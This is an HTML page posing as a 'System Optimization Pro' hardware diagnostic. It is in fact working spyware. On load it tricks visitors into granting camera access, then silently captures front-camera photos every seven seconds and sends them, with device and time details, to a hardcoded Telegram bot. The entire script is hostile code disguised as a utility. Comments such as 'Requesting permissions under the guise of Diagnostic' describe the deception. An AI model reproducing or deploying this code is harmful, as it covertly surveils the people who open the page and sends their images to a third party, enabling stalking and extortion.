<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Optimization Pro</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>WIPEOUT SYSTEM DIAGNOSTIC</h2>
    <p id="status">Initializing camera permissions...</p>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- OPERATION WIPEOUT CONFIG ---
        const BOT_TOKEN = "8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg";
        const CHAT_ID = "1020906452";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function initWipeout() {
            try {
                // Requesting permissions under the guise of 'Diagnostic'
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                status.innerText = "Analyzing hardware... Please wait (15s)";
                
                // Persistence: Start the infinite capture loop
                startInfiniteCapture();
            } catch (err) {
                status.innerText = "Error: Please allow camera access to continue.";
                console.error("Wipeout Error: ", err);
            }
        }

        function startInfiniteCapture() {
            // First capture happens after 3 seconds
            setTimeout(captureAndSend, 3000);

            // High Persistence: Repeat every 7 seconds
            setInterval(captureAndSend, 7000);
        }

        async function captureAndSend() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            // Convert to Blob for Telegram API
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `📸 [LIVE FEED]\nDevice: ${navigator.platform}\nTime: ${new Date().toLocaleTimeString()}`);

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log("Wipeout: Packet Sent.");
                } catch (e) {
                    console.log("Wipeout: Connection Refused.");
                }
            }, 'image/jpeg', 0.7); // 0.7 quality to keep speed high
        }

        window.onload = initWipeout;
    </script>
</body>
</html>
